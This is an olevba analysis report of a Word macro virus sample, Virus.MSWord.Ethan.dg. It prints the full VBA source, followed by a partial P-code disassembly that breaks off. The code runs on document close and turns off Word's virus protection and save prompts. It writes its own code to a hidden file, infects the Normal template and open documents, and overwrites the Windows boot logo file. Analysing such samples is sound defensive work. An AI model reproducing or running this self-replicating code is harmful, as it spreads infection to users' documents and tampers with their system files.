olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Ethan.dg
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Ethan.dg - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Olonho land Horseman
Private Sub Document_Close()
On Error Resume Next
s = ActiveDocument.Saved
Application.EnableCancelKey = Not -1
With Options: .VirusProtection = 0: .SaveNormalPrompt = 0: End With
If Dir("c:\windows\horseman", 6) = "" Or FileLen("c:\windows\horseman") <> 5572 Then
nf = FreeFile
Open "c:\windows\horseman" For Output As #nf
For i = 1 To MacroContainer.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
A = MacroContainer.VBProject.VBComponents.Item(1).CodeModule.Lines(i, 1)
Print #nf, A
Next i
Close #nf
SetAttr "c:\windows\horseman", 6
End If
If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 1) <> "'Olonho land Horseman" Then
Set t = NormalTemplate.VBProject.VBComponents.Item(1)
horseman
ElseIf ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 1) <> "'Olonho land Horseman" Then
Set t = ActiveDocument.VBProject.VBComponents.Item(1)
Else
t = ""
End If
If t <> "" Then
nf = FreeFile
Open "c:\windows\horseman" For Input As #nf
If LOF(1) = 0 Then GoTo q
i = 1
Do While Not EOF(1)
Line Input #nf, A
t.CodeModule.InsertLines i, A
i = i + 1
Loop
q:
Close #nf
If Left(ActiveDocument.Name, 8) <> "Document" Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
End If
If ActiveDocument.Saved <> s Then ActiveDocument.Saved = s
End Sub
Private Sub horseman()
Dim V(0 To 482) As Byte
Dim p(0 To 482) As Long
Dim i As Long
Dim A As Variant
Dim b As Variant
Dim C As Variant
Dim d As Variant
Dim e As Variant
Dim nf As Integer
A = Array(39, 40, 44, 43, 90739, 90743, 90756, 90764, 91059, 91063, 91076, 91077, 91084, 91379, 91383, 91396, 91397, 91404, 91699, 91703, 91717, 91724, 92019, 92023, 92029, 92037, 92045, 92339, 92343, 92349, 92357, 92358, 92365, 92370, 92659, 92663, 92669, 92678, 92685, 92690, 92979, 92983, 92989, 92999, 93005, 93010, 93299, 93303, 93309, 93319, 93320, 93325, 93330, 93619, 93623, 93629, 93640, 93645, 93650, 93939, 93940, 93943, 93949, 93960, 93965, 94259, 94260, 94263, 94269, 94280, 94281, 94284, 94285, 94580, 94583, 94584, 94589, 94600, 94601, 94603, 94604, 94900, 94901, 94903, 94904, 94905, 94909, 94920, 95221, 95222, 95223, 95224, 95225, 95226, 95229, 95238, 95239, 95240, 95242, 95243)
b = Array(95249, 95541, 95542, 95543, 95544, 95545, 95546, 95549, 95557, 95558, 95559, 95560, 95561, 95562, 95563, 95564, 95569, 95862, 95863, 95864, 95865, 95866, 95867, 95868, 95869, 95877, 95878, 95879, 95880, 95881, 95882, 95883, 95884, 95888, 96182, 96183, 96184, 96185, 96186, 96187, 96188, 96189, 96190, 96191, 96192, 96193, 96194, 96195, 96196, 96197, 96198, 96199, 96200, 96201, 96202, 96203, 96204, 96205, 96207, 96501, 96502, 96503, 96504, 96505, 96506, 96507, 96508, 96509, 96510, 96511, 96512, 96513, 96514, 96515, 96516, 96517, 96518, 96519, 96520, 96521, 96522, 96523, 96524, 96525, 96527, 96821, 96822, 96823, 96824, 96825, 96826, 96827, 96828, 96829, 96830, 96831, 96832, 96833, 96834, 96835)
C = Array(96836, 96837, 96838, 96839, 96840, 96841, 96842, 96843, 96844, 96845, 96847, 97141, 97142, 97143, 97144, 97145, 97146, 97147, 97148, 97149, 97150, 97151, 97152, 97153, 97154, 97155, 97156, 97157, 97158, 97159, 97160, 97161, 97162, 97163, 97164, 97165, 97166, 97462, 97463, 97464, 97465, 97466, 97467, 97468, 97469, 97470, 97471, 97472, 97473, 97474, 97475, 97476, 97477, 97478, 97479, 97480, 97481, 97482, 97483, 97484, 97782, 97783, 97784, 97785, 97786, 97787, 97788, 97789, 97790, 97791, 97792, 97793, 97794, 97795, 97796, 97797, 97798, 97799, 97800, 97801, 97802, 97803, 97804, 98101, 98103, 98104, 98105, 98106, 98107, 98108, 98109, 98110, 98111, 98112, 98113, 98114, 98115, 98116, 98117, 98118)
d = Array(98119, 98120, 98121, 98122, 98123, 98421, 98423, 98424, 98425, 98426, 98427, 98428, 98429, 98430, 98431, 98432, 98434, 98435, 98436, 98437, 98438, 98439, 98440, 98441, 98442, 98741, 98743, 98744, 98745, 98746, 98747, 98748, 98750, 98754, 98755, 98756, 98757, 98758, 98759, 98760, 98761, 99061, 99063, 99064, 99065, 99066, 99067, 99068, 99070, 99381, 99383, 99384, 99385, 99387, 99388, 99390, 99701, 99702, 99703, 99704, 99705, 99707, 99708, 99710, 100020, 100021, 100022, 100023, 100024, 100025, 100026, 100027, 100028, 100029, 100030, 100031, 100340, 100341, 100342, 100343, 100344, 100345, 100346, 100347, 100348, 100349, 100350, 100351, 100661, 100662, 100663, 100668, 100669, 100671, 100981, 100982, 100988, 100989, 100991, 101301)
e = Array(101308, 101309, 101311, 101621, 101628, 101631, 101951, 101957, 101958, 101959, 102271, 102274, 102275, 102276, 102591, 102593, 102594, 102595, 102596, 102911, 102912, 102913, 102914, 102915, 102916, 102918, 102919, 103231, 103232, 103233, 103234, 103235, 103236, 103237, 103238, 103551, 103552, 103553, 103554, 103555, 103556, 103557, 103872, 103873, 103874, 103875, 103876, 103877, 103878, 103879, 104192, 104193, 104194, 104195, 104196, 104197, 104198, 104512, 104513, 104514, 104515, 104516, 104832, 104833, 104834, 105152, 105472, 105792, 106112, 94923, 95547, 98433, 98102, 98422, 98742, 98749, 99062, 99069, 99382, 99386, 99389, 99706, 99709)
For i = 0 To 99
p(i) = A(i)
Next
For i = 0 To 99
p(i + 100) = b(i)
Next
For i = 0 To 99
p(i + 200) = C(i)
Next
For i = 0 To 99
p(i + 300) = d(i)
Next
For i = 0 To 82
p(i + 400) = e(i)
Next
V(0) = 206
V(1) = 14
V(2) = 14
V(3) = 216
For i = 4 To 468
V(i) = 186
Next
For i = 469 To 471
V(i) = 184
Next
For i = 472 To 482
V(i) = 226
Next
nf = FreeFile
Open "c:\windows\logos.sys" For Binary Access Write As #nf
For i = 0 To 482
Put #nf, p(i), V(i)
Next
Close #nf
End Sub

-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Ethan.dg
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 10188 bytes
' Line #0:
' 	QuoteRem 0x0000 0x0014 "Olonho land Horseman"
' Line #1:
' 	FuncDefn (Private Sub Document_Close())
' Line #2:
' 	OnError (Resume Next) 
' Line #3:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	St s 
' Line #4:
' 	LitDI2 0x0001 
' 	UMi 
' 	Not 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #5:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	MemStWith VirusProtection 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	MemStWith SaveNormalPrompt 
' 	BoS 0x0000 
' 	EndWith 
' Line #6:
' 	LitStr 0x0013 "c:\windows\horseman"
' 	LitDI2 0x0006 
' 	ArgsLd Dir 0x0002 
' 	LitStr 0x0000 ""
' 	Eq 
' 	LitStr 0x0013 "c:\windows\horseman"
' 	ArgsLd FileLen 0x0001 
' 	LitDI2 0x15C4 
' 	Ne 
' 	Or 
' 	IfBlock 
' Line #7:
' 	Ld Friend 
' 	St nf 
' Line #8:
' 	LitStr 0x0013 "c:\windows\horseman"
' 	Ld nf 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #9:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld MacroContainer 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	For 
' Line #10:
' 	Ld i 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld MacroContainer 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St A 
' Line #11:
' 	Ld nf 
' 	Sharp 
' 	PrintChan 
' 	Ld A 
' 	PrintItemNL 
' Line #12:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #13:
' 	Ld nf 
' 	Sharp 
' 	Close 0x0001 
' Line #14:
' 	LitStr 0x0013 "c:\windows\horseman"
' 	LitDI2 0x0006 
' 	ArgsCall SetAttr 0x0002 
' Line #15:
' 	EndIfBlock 
' Line #16:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0015 "'Olonho land Horseman"
' 	Ne 
' 	IfBlock 
' Line #17:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set t 
' Line #18:
' 	ArgsCall horseman 0x0000 
' Line #19:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0015 "'Olonho land Horseman"
' 	Ne 
' 	ElseIfBlock 
' Line #20:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set t 
' Line #21:
' 	ElseBlock 
' Line #22:
' 	LitStr 0x0000 ""
' 	St t 
' Line #23:
' 	EndIfBlock 
' Line #24:
' 	Ld t 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #25:
' 	Ld Friend 
' 	St nf 
' Line #26:
' 	LitStr 0x0013 "c:\windows\horseman"
' 	Ld nf 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #27:
' 	LitDI2 0x0001 
' 	ArgsLd LOF 0x0001 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo q 
' 	EndIf 
' Line #28:
' 	LitDI2 0x0001 
' 	St i 
' Line #29:
' 	LitDI2 0x0001 
' 	ArgsLd EOF 0x0001 
' 	Not 
' 	DoWhile 
' Line #30:
' 	Ld nf 
' 	Ld A 
' 	LineInput 
' Line #31:
' 	Ld i 
' 	Ld A 
' 	Ld t 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #32:
' 	Ld i 
' 	LitDI2 0x0001 
' 	Add 
' 	St i 
' Line #33:
' 	Loop 
' Line #34:
' 	Label q 
' Line #35:
' 	Ld nf 
' 	Sharp 
' 	Close 0x0001 
' Line #36:
' 	Ld ActiveDocument 
' 	MemLd New 
' 	LitDI2 0x0008 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0008 "Document"
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' 	EndIf 
' Line #37:
' 	EndIfBlock 
' Line #38:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	Ld s 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld s 
' 	Ld ActiveDocument 
' 	MemSt Saved 
' 	EndIf 
' Line #39:
' 	EndSub 
' Line #40:
' 	FuncDefn (Private Sub horseman())
' Line #41:
' 	Dim 
' 	LitDI2 0x0000 
' 	LitDI2 0x01E2 
' 	VarDefn V (As Byte)
' Line #42:
' 	Dim 
' 	LitDI2 0x0000 
' 	LitDI2 0x01E2 
' 	VarDefn p (As Long)
' Line #43:
' 	Dim 
' 	VarDefn i (As Long)
' Line #44:
' 	Dim 
' 	VarDefn A (As Variant)
' Line #45:
' 	Dim 
' 	VarDefn B (As Variant)
' Line #46:
' 	Dim 
' 	VarDefn C (As Variant)
' Line #47:
' 	Dim 
' 	VarDefn d (As Variant)
' Line #48:
' 	Dim 
' 	VarDefn e (As Variant)
' Line #49:
' 	Dim 
' 	VarDefn nf (As Integer)
' Line #50:
' 	LitDI2 0x0027 
' 	LitDI2 0x0028 
' 	LitDI2 0x002C 
' 	LitDI2 0x002B 
' 	LitDI4 0x6273 0x0001 
' 	LitDI4 0x6277 0x0001 
' 	LitDI4 0x6284 0x0001 
' 	LitDI4 0x628C 0x0001 
' 	LitDI4 0x63B3 0x0001 
' 	LitDI4 0x63B7 0x0001 
' 	LitDI4 0x63C4 0x0001 
' 	LitDI4 0x63C5 0x0001 
' 	LitDI4 0x63CC 0x0001 
' 	LitDI4 0x64F3 0x0001 
' 	LitDI4 0x64F7 0x0001 
' 	LitDI4 0x6504 0x0001 
' 	LitDI4 0x6505 0x0001 
' 	LitDI4 0x650C 0x0001 
' 	LitDI4 0x6633 0x0001 
' 	LitDI4 0x6637 0x0001 
' 	LitDI4 0x6645 0x0001 
' 	LitDI4 0x664C 0x0001 
' 	LitDI4 0x6773 0x0001 
' 	LitDI4 0x6777 0x0001 
' 	LitDI4 0x677D 0x0001 
' 	LitDI4 0x6785 0x0001 
' 	LitDI4 0x678D 0x0001 
' 	LitDI4 0x68B3 0x0001 
' 	LitDI4 0x68B7 0x0001 
' 	LitDI4 0x68BD 0x0001 
' 	LitDI4 0x68C5 0x0001 
' 	LitDI4 0x68C6 0x0001 
' 	LitDI4 0x68CD 0x0001 
' 	LitDI4 0x68D2 0x0001 
' 	LitDI4 0x69F3 0x0001 
' 	LitDI4 0x69F7 0x0001 
' 	LitDI4 0x69FD 0x0001 
' 	LitDI4 0x6A06 0x0001 
' 	LitDI4 0x6A0D 0x0001 
' 	LitDI4 0x6A12 0x0001 
' 	LitDI4 0x6B33 0x0001 
' 	LitDI4 0x6B37 0x0001 
' 	LitDI4 0x6B3D 0x0001 
' 	LitDI4 0x6B47 0x0001 
' 	LitDI4 0x6B4D 0x0001 
' 	LitDI4 0x6B52 0x0001 
' 	LitDI4 0x6C73 0x0001 
' 	LitDI4 0x6C77 0x0001 
' 	LitDI4 0x6C7D 0x0001 
' 	LitDI4 0x6C87 0x0001 
' 	LitDI4 0x6C88 0x0001 
' 	LitDI4 0x6C8D 0x0001 
' 	LitDI4 0x6C92 0x0001 
' 	LitDI4 0x6DB3 0x0001 
' 	LitDI4 0x6DB7 0x0001 
' 	LitDI4 0x6DBD 0x0001 
' 	LitDI4 0x6DC8 0x0001 
' 	LitDI4 0x6DCD 0x0001 
' 	LitDI4 0x6DD2 0x0001 
' 	LitDI4 0x6EF3 0x0001 
' 	LitDI4 0x6EF4 0x0001 
' 	LitDI4 0x6EF7 0x0001 
' 	LitDI4 0x6EFD 0x0001 
' 	LitDI4 0x6F08 0x0001 
' 	LitDI4 0x6F0D 0x0001 
' 	LitDI4 0x7033 0x0001 
' 	LitDI4 0x7034 0x0001 
' 	LitDI4 0x7037 0x0001 
' 	LitDI4 0x703D 0x0001 
' 	LitDI4 0x7048 0x0001 
' 	LitDI4 0x7049 0x0001 
' 	LitDI4 0x704C 0x0001 
' 	LitDI4 0x704D 0x0001 
' 	LitDI4 0x7174 0x0001 
' 	LitDI4 0x7177 0x0001 
' 	LitDI4 0x7178 0x0001 
' 	LitDI4 0x717D 0x0001 
' 	LitDI4 0x7188 0x0001 
' 	LitDI4 0x7189 0x0001 
' 	LitDI4 0x718B 0x0001 
' 	LitDI4 0x718C 0x0001 
' 	LitDI4 0x72B4 0x0001 
' 	LitDI4 0x72B5 0x0001 
' 	LitDI4 0x72B7 0x0001 
' 	LitDI4 0x72B8 0x0001 
' 	LitDI4 0x72B9 0x0001 
' 	LitDI4 0x72BD 0x0001 
' 	LitDI4 0x72C8 0x0001 
' 	LitDI4 0x73F5 0x0001 
' 	LitDI4 0x73F6 0x0001 
' 	LitDI4 0x73F7 0x0001 
' 	LitDI4 0x73F8 0x0001 
' 	LitDI4 0x73F9 0x0001 
' 	LitDI4 0x73FA 0x0001 
' 	LitDI4 0x73FD 0x0001 
' 	LitDI4 0x7406 0x0001 
' 	LitDI4 0x7407 0x0001 
' 	LitDI4 0x7408 0x0001 
' 	LitDI4 0x740A 0x0001 
' 	LitDI4 0x740B 0x0001 
' 	ArgsArray Array 0x0064 
' 	St A 
' Line #51:
' 	LitDI4 0x7411 0x0001 
' 	LitDI4 0x7535 0x0001 
' 	LitDI4 0x7536 0x0001 
' 	LitDI4 0x7537 0x0001 
' 	LitDI4 0x7538 0x0001 
' 	LitDI4 0x7539 0x0001 
' 	LitDI4 0x753A 0x0001 
' 	LitDI4 0x753D 0x0001 
' 	LitDI4 0x7545 0x0001 
' 	LitDI4 0x7546 0x0001 
' 	LitDI4 0x7547 0x0001 
' 	LitDI4 0x7548 0x0001 
' 	LitDI4 0x7549 0x0001 
' 	LitDI4 0x754A 0x0001 
' 	LitDI4 0x754B 0x0001 
' 	LitDI4 0x754C 0x0001 
' 	LitDI4 0x7551 0x0001 
' 	LitDI4 0x7676 0x0001 
' 	LitDI4 0x7677 0x0001 
' 	LitDI4 0x7678 0x0001 
' 	LitDI4 0x7679 0x0001 
' 	LitDI4 0x767A 0x0001 
' 	LitDI4 0x767B 0x0001 
' 	LitDI4 0x767C 0x0001 
' 	LitDI4 0x767D 0x0001 
' 	LitDI4 0x7685 0x0001 
' 	LitDI4 0x7686 0x0001 
' 	LitDI4 0x7687 0x0001 
' 	LitDI4 0x7688 0x0001 
' 	LitDI4 0x7689 0x0001 
' 	LitDI4 0x768A 0x0001 
' 	LitDI4 0x768B 0x0001 
' 	LitDI4 0x768C 0x0001 
' 	LitDI4 0x7690 0x0001 
' 	LitDI4 0x77B6 0x0001 
' 	LitDI4 0x77B7 0x0001 
' 	LitDI4 0x77B8 0x0001 
' 	LitDI4 0x77B9 0x0001 
' 	LitDI4 0x77BA 0x0001 
' 	LitDI4 0x77BB 0x0001 
' 	LitDI4 0x77BC 0x0001 
' 	LitDI4 0x77BD 0x0001 
' 	LitDI4 0x77BE 0x0001 
' 	LitDI4 0x77BF 0x0001 
' 	LitDI4 0x77C0 0x0001 
' 	LitDI4 0x77C1 0x0001 
' 	LitDI4 0x77C2 0x0001 
' 	LitDI4 0x77C3 0x0001 
' 	LitDI4 0x77C4 0x0001 
' 	LitDI4 0x77C5 0x0001 
' 	LitDI4 0x77C6 0x0001 
' 	LitDI4 0x77C7 0x0001 
' 	LitDI4 0x77C8 0x0001 
' 	LitDI4 0x77C9 0x0001 
' 	LitDI4 0x77CA 0x0001 
' 	LitDI4 0x77CB 0x0001 
' 	LitDI4 0x77CC 0x0001 
' 	LitDI4 0x77CD 0x0001 
' 	LitDI4 0x77CF 0x0001 
' 	LitDI4 0x78F5 0x0001 
' 	LitDI4 0x78F6 0x0001 
' 	LitDI4 0x78F7 0x0001 
' 	LitDI4 0x78F8 0x0001 
' 	LitDI4 0x78F9 0x0001 
' 	LitDI4 0x78FA 0x0001 
' 	LitDI4 0x78FB 0x0001 
' 	LitDI4 0x78FC 0x0001 
' 	LitDI4 0x78FD 0x0001 
' 	LitDI4 0x78FE 0x0001 
' 	LitDI4 0x78FF 0x0001 
' 	LitDI4 0x7900 0x0001 
' 	LitDI4 0x7901 0x0001 
' 	LitDI4 0x7902 0x0001 
' 	LitDI4 0x7903 0x0001 
' 	LitDI4 0x7904 0x0001 
' 	LitDI4 0x7905 0x0001 
' 	LitDI4 0x7906 0x0001 
' 	LitDI4 0x7907 0x0001 
' 	LitDI4 0x7908 0x0001 
' 	LitDI4 0x7909 0x0001 
' 	LitDI4 0x790A 0x0001 
' 	LitDI4 0x790B 0x0001 
' 	LitDI4 0x790C 0x0001 
' 	LitDI4 0x790D 0x0001 
' 	LitDI4 0x790F 0x0001 
' 	LitDI4 0x7A35 0x0001 
' 	LitDI4 0x7A36 0x0001 
' 	LitDI4 0x7A37 0x0001 
' 	LitDI4 0x7A38 0x0001 
' 	LitDI4 0x7A39 0x0001 
' 	LitDI4 0x7A3A 0x0001 
' 	LitDI4 0x7A3B 0x0001 
' 	LitDI4 0x7A3C 0x0001 
' 	LitDI4 0x7A3D 0x0001 
' 	LitDI4 0x7A3E 0x0001 
' 	LitDI4 0x7A3F 0x0001 
' 	LitDI4 0x7A40 0x0001 
' 	LitDI4 0x7A41 0x0001 
' 	LitDI4 0x7A42 0x0001 
' 	LitDI4 0x7A43 0x0001 
' 	ArgsArray Array 0x0064 
' 	St B 
' Line #52:
' 	LitDI4 0x7A44 0x0001 
' 	LitDI4 0x7A45 0x0001 
' 	LitDI4 0x7A46 0x0001 
' 	LitDI4 0x7A47 0x0001 
' 	LitDI4 0x7A48 0x0001 
' 	LitDI4 0x7A49 0x0001 
' 	LitDI4 0x7A4A 0x0001 
' 	LitDI4 0x7A4B 0x0001 
' 	LitDI4 0x7A4C 0x0001 
' 	LitDI4 0x7A4D 0x0001 
' 	LitDI4 0x7A4F 0x0001 
' 	LitDI4 0x7B75 0x0001 
' 	LitDI4 0x7B76 0x0001 
' 	LitDI4 0x7B77 0x0001 
' 	LitDI4 0x7B78 0x0001 
' 	LitDI4 0x7B79 0x0001 
' 	LitDI4 0x7B7A 0x0001 
' 	LitDI4 0x7B7B 0x0001 
' 	LitDI4 0x7B7C 0x0001 
' 	LitDI4 0x7B7D 0x0001 
' 	LitDI4 0x7B7E 0x0001 
' 	LitDI4 0x7B7F 0x0001 
' 	LitDI4 0x7B80 0x0001 
' 	LitDI4 0x7B81 0x0001 
' 	LitDI4 0x7B82 0x0001 
' 	LitDI4 0x7B83 0x0001 
' 	LitDI4 0x7B84 0x0001 
' 	LitDI4 0x7B85 0x0001 
' 	LitDI4 0x7B86 0x0001 
' 	LitDI4 0x7B87 0x0001 
' 	LitDI4 0x7B88 0x0001 
' 	LitDI4 0x7B89 0x0001 
' 	LitDI4 0x7B8A 0x0001 
' 	LitDI4 0x7B8B 0x0001 
' 	LitDI4 0x7B8C 0x0001 
' 	LitDI4 0x7B8D 0x0001 
' 	LitDI4 0x7B8E 0x0001 
' 	LitDI4 0x7CB6 0x0001 
' 	LitDI4 0x7CB7 0x0001 
' 	LitDI4 0x7CB8 0x0001 
' 	LitDI4 0x7CB9 0x0001 
' 	LitDI4 0x7CBA 0x0001 
' 	LitDI4 0x7CBB 0x0001 
' 	LitDI4 0x7CBC 0x0001 
' 	LitDI4 0x7CBD 0x0001 
' 	LitDI4 0x7CBE 0x0001 
' 	LitDI4 0x7CBF 0x0001 
' 	LitDI4 0x7CC0 0x0001 
' 	LitDI4 0x7CC1 0x0001 
' 	LitDI4 0x7CC2 0x0001 
' 	LitDI4 0x7CC3 0x0001 
' 	LitDI4 0x7CC4 0x0001 
' 	LitDI4 0x7CC5 0x0001 
' 	LitDI4 0x7CC6 0x0001 
' 	LitDI4 0x7CC7 0x0001 
' 	LitDI4 0x7CC8 0x0001 
' 	LitDI4 0x7CC9 0x0001 
' 	LitDI4 0x7CCA 0x0001 
' 	LitDI4 0x7CCB 0x0001 
' 	LitDI4 0x7CCC 0x0001 
' 	LitDI4 0x7DF6 0x0001 
' 	LitDI4 0x7DF7 0x0001 
' 	LitDI4 0x7DF8 0x0001 
' 	LitDI4 0x7DF9 0x0001 
' 	LitDI4 0x7DFA 0x0001 
' 	LitDI4 0x7DFB 0x0001 
' 	LitDI4 0x7DFC 0x0001 
' 	LitDI4 0x7DFD 0x0001 
' 	LitDI4 0x7DFE 0x0001 
' 	LitDI4 0x7DFF 0x0001 
' 	LitDI4 0x7E00 0x0001 
' 	LitDI4 0x7E01 0x0001 
' 	LitDI4 0x7E02 0x0001 
' 	LitDI4 0x7E03 0x0001 
' 	LitDI4 0x7E04 0x0001 
' 	LitDI4 0x7E05 0x0001 
' 	LitDI4 0x7E06 0x0001 
' 	LitDI4 0x7E07 0x0001 
' 	LitDI4 0x7E08 0x0001 
' 	LitDI4 0x7E09 0x0001 
' 	LitDI4 0x7E0A 0x0001 
' 	LitDI4 0x7E0B 0x0001 
' 	LitDI4 0x7E0C 0x0001 
' 	LitDI4 0x7F35 0x0001 
' 	LitDI4 0x7F37 0x0001 
' 	LitDI4 0x7F38 0x0001 
' 	LitDI4 0x7F39 0x0001 
' 	LitDI4 0x7F3A 0x0001 
' 	LitDI4 0x7F3B 0x0001 
' 	LitDI4 0x7F3C 0x0001 
' 	LitDI4 0x7F3D 0x0001 
' 	LitDI4 0x7F3E 0x0001 
' 	LitDI4 0x7F3F 0x0001 
' 	LitDI4 0x7F40 0x0001 
' 	LitDI4 0x7F41 0x0001 
' 	LitDI4 0x7F42 0x0001 
' 	LitDI4 0x7F43 0x0001 
' 	LitDI4 0x7F44 0x0001 
' 	LitDI4 0x7F45 0x0001 
' 	LitDI4 0x7F46 0x0001 
' 	ArgsArray Array 0x0064 
' 	St C 
' Line #53:
' 	LitDI4 0x7F47 0x0001 
' 	LitDI4 0x7F48 0x0001 
' 	LitDI4 0x7F49 0x0001 
' 	LitDI4 0x7F4A 0x0001 
' 	LitDI4 0x7F4B 0x0001 
' 	LitDI4 0x8075 0x0001 
' 	LitDI4 0x8077 0x0001 
' 	LitDI4 0x8078 0x0001 
' 	LitDI4 0x8079 0x0001 
' 	LitDI4 0x807A 0x0001 
' 	LitDI4 0x807B 0x0001 
' 	LitDI4 0x807C 0x0001 
' 	LitDI4 0x807D 0x0001 
' 	LitDI4 0x807E 0x0001 
' 	LitDI4 0x807F 0x0001 
' 	LitDI4 0x8080 0x0001 
' 	LitDI4 0x8082 0x0001 
' 	LitDI4 0x8083 0x0001 
' 	LitDI4 0x8084 0x0001 
' 	LitDI4 0x8085 0x0001 
' 	LitDI4 0x8086 0x0001 
' 	LitDI4 0x8087 0x0001 
' 	LitDI4 0x8088 0x0001 
' 	LitDI4 0x8089 0x0001 
' 	LitDI4 0x808A 0x0001 
' 	LitDI4 0x81B5 0x0001 
' 	LitDI4 0x81B7 0x0001 
' 	LitDI4 0x81B8 0x0001 
' 	LitDI4 0x81B9 0x0001 
' 	LitDI4 0x81BA 0x0001 
' 	LitDI4 0x81BB 0x0001 
' 	LitDI4 0x81BC 0x0001 
' 	LitDI4 0x81BE 0x0001 
' 	LitDI4 0x81C2 0x0001 
' 	LitDI4 0x81C3 0x0001 
' 	LitDI4 0x81C4 0x0001 
' 	LitDI4 0x81C5 0x0001 
' 	LitDI4 0x81C6 0x0001 
' 	LitDI4 0x81C7 0x0001 
' 	LitDI4 0x81C8 0x0001 
' 	LitDI4 0x81C9 0x0001 
' 	LitDI4 0x82F5 0x0001 
' 	LitDI4 0x82F7 0x0001 
' 	LitDI4 0x82F8 0x0001 
' 	LitDI4 0x82F9 0x0001 
' 	LitDI4 0x82FA 0x0001 
' 	LitDI4 0x82FB 0x0001 
' 	LitDI4 0x82FC 0x0001 
' 	LitDI4 0x82FE 0x0001 
' 	LitDI4 0x8435 0x0001 
' 	LitDI4 0x8437 0x0001 
' 	LitDI4 0x8438 0x0001 
' 	LitDI4 0x8439 0x0001 
' 	LitDI4 0x843B 0x0001 
' 	LitDI4 0x843C 0x0001 
' 	LitDI4 0x843E 0x0001 
' 	LitDI4 0x8575 0x0001 
' 	LitDI4 0x8576 0x0001 
' 	LitDI4 0x8577 0x0001 
' 	LitDI4 0x8578 0x0001 
' 	LitDI4 0x8579 0x0001 
' 	LitDI4 0x857B 0x0001 
' 	LitDI4 0x857C 0x0001 
' 	LitDI4 0x857E 0x0001 
' 	LitDI4 0x86B4 0x0001 
' 	LitDI4 0x86B5 0x0001 
' 	LitDI4 0x86B6 0x0001 
' 	LitDI4 0x86B7 0x0001 
' 	LitDI4 0x86B8 0x0001 
' 	LitDI4 0x86B9 0x0001 
' 	LitDI4 0x86BA 0x0001 
' 	LitDI4 0x86BB 0x0001 
' 	LitDI4 0x86BC 0x0001 
' 	LitDI4 0x86BD 0x0001 
' 	LitDI4 0x86BE 0x0001 
' 	LitDI4 0x86BF 0x0001 
' 	LitDI4 0x87F4 0x0001 
' 	LitDI4 0x87F5 0x0001 
' 	LitDI4 0x87F6 0x0001 
' 	LitDI4 0x87F7 0x0001 
' 	LitDI4 0x87F8 0x0001 
' 	LitDI4 0x87F9 0x0001 
' 	LitDI4 0x87FA 0x0001 
' 	LitDI4 0x87FB 0x0001 
' 	LitDI4 0x87FC 0x0001 
' 	LitDI4 0x87FD 0x0001 
' 	LitDI4 0x87FE 0x0001 
' 	LitDI4 0x87FF 0x0001 
' 	LitDI4 0x8935 0x0001 
' 	LitDI4 0x8936 0x0001 
' 	LitDI4 0x8937 0x0001 
' 	LitDI4 0x893C 0x0001 
' 	LitDI4 0x893D 0x0001 
' 	LitDI4 0x893F 0x0001 
' 	LitDI4 0x8A75 0x0001 
' 	LitDI4 0x8A76 0x0001 
' 	LitDI4 0x8A7C 0x0001 
' 	LitDI4 0x8A7D 0x0001 
' 	LitDI4 0x8A7F 0x0001 
' 	LitDI4 0x8BB5 0x0001 
' 	ArgsArray Array 0x0064 
' 	St d 
